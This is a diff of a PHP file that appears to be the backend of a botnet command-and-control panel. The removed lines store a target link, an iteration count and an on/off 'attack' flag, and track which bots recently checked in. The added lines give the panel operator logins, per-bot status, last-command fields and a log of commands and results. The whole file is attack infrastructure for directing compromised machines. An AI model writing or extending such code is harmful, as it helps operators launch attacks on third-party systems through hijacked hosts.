@@ -1,77 +1,63 @@
 <?php
+// File paths
+define('USER_FILE', 'users.json');
+define('BOT_FILE', 'bots.json');
+define('LOG_FILE', 'command_log.json');
 
-$data_file = 'data.db';
-$data = file_get_contents($data_file);
-
-function getAllData()
-{
-    $data = unserialize($GLOBALS['data']);
-    return $data;
-}
-
-function saveAllData($allData)
-{
-    $allData = serialize($allData);
-    file_put_contents($GLOBALS['data_file'], $allData);
-}
-
-function getBotsData()
-{
-    $data = getAllData();
-    return $data['bots'];
-}
-
-function saveBotData($all_bot_data)
-{
-    $all_data = getAllData();
-    $all_data['bots'] = $all_bot_data;
-    saveAllData($all_data);
-}
-
-function getLiveBots()
-{
-    $all_bot_data = getBotsData();
-
-    $flag = 0;
-    foreach($all_bot_data as $bot_id => $time) {
-        if((time()-$time) >= 100)
-            unset($all_bot_data[$bot_id]);
+// Helper function to read JSON file and decode it
+function read_json($file) {
+    if (!file_exists($file)) {
+        return [];
     }
-    return $all_bot_data;
+    $content = file_get_contents($file);
+    return json_decode($content, true);
 }
 
-function saveLinkAndIter($link, $iter)
-{
-    $allData = getAllData();
-    $allData['link'] = $link;
-    $allData['iter'] = $iter;
-    $allData['attack'] = '1';
-    saveAllData($allData);
+// Helper function to write to JSON file
+function write_json($file, $data) {
+    file_put_contents($file, json_encode($data, JSON_PRETTY_PRINT));
 }
 
-function stopAttack()
-{
-    $allData = getAllData();
-    $allData['attack'] = '0';
-    saveAllData($allData);
+// User Authentication (using password hashing)
+function authenticate($username, $password) {
+    $users = read_json(USER_FILE);
+    foreach ($users as $user) {
+        if ($user['username'] === $username && password_verify($password, $user['password'])) {
+            return $user;
+        }
+    }
+    return null;
 }
 
-function getIterValue()
-{
-    $allData = getAllData();
-    return $allData['iter'];
+// Get Bot Data
+function getBotsData() {
+    return read_json(BOT_FILE);
 }
 
-function getAttackValue()
-{
-    $allData = getAllData();
-    return $allData['attack'];
+// Update Bot Status
+function updateBotStatus($bot_id, $status, $last_command = null) {
+    $bots = getBotsData();
+    foreach ($bots as &$bot) {
+        if ($bot['bot_id'] === $bot_id) {
+            $bot['status'] = $status;
+            $bot['last_active'] = date('Y-m-d H:i:s');
+            if ($last_command) {
+                $bot['last_command'] = $last_command;
+            }
+        }
+    }
+    write_json(BOT_FILE, $bots);
 }
 
-function getLinkValue()
-{
-    $allData = getAllData();
-    return $allData['link'];
+// Log Command
+function logCommand($bot_id, $command, $result) {
+    $logs = read_json(LOG_FILE);
+    $logs[] = [
+        'bot_id' => $bot_id,
+        'command' => $command,
+        'result' => $result,
+        'timestamp' => date('Y-m-d H:i:s')
+    ];
+    write_json(LOG_FILE, $logs);
 }
-
 ?>
